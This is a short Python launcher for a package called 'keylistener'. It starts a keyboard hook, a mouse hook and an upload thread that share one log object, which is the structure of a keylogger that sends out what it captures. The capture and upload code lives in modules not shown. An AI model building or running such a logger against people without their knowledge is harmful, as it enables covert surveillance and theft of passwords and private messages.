#!/usr/bin/python
# -*- coding: utf-8 -*-

import time
import sys
import io
sys.path.append('../')
from keylistener.app.Constant import Constant
from keylistener.entity.LogData import LogData
from keylistener.hook.KeyHook import KeyHook
from keylistener.hook.MouseHook import MouseHook
from keylistener.thread.UploadThread import UploadThread

def main():
    Constant.init()
    data = LogData()

    UploadThread(data).start()
    KeyHook(data).start()
    MouseHook(data).start()
    # while True:
    #     time.sleep(1)
    #     print(data)

if __name__ == '__main__':
    main()


